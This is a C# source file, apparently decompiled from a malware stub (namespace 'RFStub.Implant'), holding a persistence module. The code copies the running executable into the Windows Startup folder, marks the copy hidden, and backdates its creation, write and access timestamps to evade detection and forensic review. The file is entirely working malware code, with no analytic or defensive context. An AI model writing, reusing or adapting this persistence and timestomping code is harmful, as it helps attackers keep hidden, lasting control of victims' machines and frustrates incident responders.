using System;
using System.IO;
using System.Reflection;

namespace RFStub.Implant;

internal sealed class Startup
{
	private static readonly string StartupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

	public static readonly string ExecutablePath = Assembly.GetEntryAssembly()!.Location;

	private static readonly string CopyExecutableTo = StartupDirectory + "\\" + Path.GetFileName(ExecutablePath);

	public static void SetFileCreationDate(string path = null)
	{
		string path2 = path;
		if (path == null)
		{
			path2 = ExecutablePath;
		}
		DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
		File.SetCreationTime(path2, dateTime);
		File.SetLastWriteTime(path2, dateTime);
		File.SetLastAccessTime(path2, dateTime);
	}

	public static void HideFile(string path = null)
	{
		string fileName = path;
		if (path == null)
		{
			fileName = ExecutablePath;
		}
		new FileInfo(fileName).Attributes |= FileAttributes.Hidden;
	}

	public static bool IsInstalled()
	{
		return File.Exists(StartupDirectory + "\\" + Path.GetFileName(ExecutablePath));
	}

	public static void Install()
	{
		File.Copy(ExecutablePath, CopyExecutableTo);
		HideFile(CopyExecutableTo);
		SetFileCreationDate(CopyExecutableTo);
	}

	public static bool IsFromStartup()
	{
		return ExecutablePath.StartsWith(StartupDirectory);
	}
}
